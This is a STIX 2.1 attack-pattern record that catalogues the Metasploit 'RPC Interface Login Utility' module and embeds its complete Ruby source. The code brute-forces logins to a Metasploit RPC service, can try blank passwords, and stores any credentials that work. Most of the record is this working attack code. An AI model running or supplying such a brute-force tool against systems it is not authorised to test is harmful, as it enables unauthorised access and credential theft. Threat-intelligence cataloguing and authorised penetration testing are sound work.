{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--efa36d5d-6e0a-4f4b-b23d-98ee6b000d63",
    "created": "2024-08-14T16:26:34.001795Z",
    "modified": "2024-08-14T16:26:34.001799Z",
    "name": "Metasploit RPC Interface Login Utility",
    "description": " This module simply attempts to login to a Metasploit RPC interface using a specific user/pass. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/msf/msf_rpc_login.rb",
            "external_id": "msf_rpc_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Metasploit RPC Interface Login Utility',\n      'Description'   => %q{\n        This module simply attempts to login to a\n        Metasploit RPC interface using a specific\n        user/pass.\n      },\n      'Author'        => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],\n      'License'       => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(55553),\n        OptString.new('USERNAME', [true, \"A specific username to authenticate as. Default is msf\", \"msf\"]),\n        OptBool.new('BLANK_PASSWORDS', [false, \"Try blank passwords for all users\", false]),\n        OptBool.new('SSL', [ true, \"Negotiate SSL for outgoing connections\", true])\n      ])\n\n    register_autofilter_ports([3790])\n  end\n\n  def run_host(ip)\n    begin\n      @rpc = Msf::RPC::Client.new(\n        :host => rhost,\n        :port => rport,\n        :ssl  => ssl\n      )\n    rescue ::Interrupt\n      raise $!\n    rescue => e\n      vprint_error(\"Cannot create RPC client : #{e}\")\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user = 'msf', pass = 'msf')\n    vprint_status(\"Trying username:'#{user}' with password:'#{pass}'\")\n    begin\n      res = @rpc.login(user, pass)\n      if res\n        print_good(\"SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'msf-rpc',\n          user: user,\n          password: pass\n        )\n        return :next_user\n      end\n    rescue Rex::ConnectionRefused => e\n      print_error(\"Connection refused : #{e}\")\n      return :abort\n    rescue => e\n      vprint_status(\"#{peer} - Bad login\")\n      return :skip_pass\n    end\n  ensure\n    @rpc.close\n  end\nend\n"
}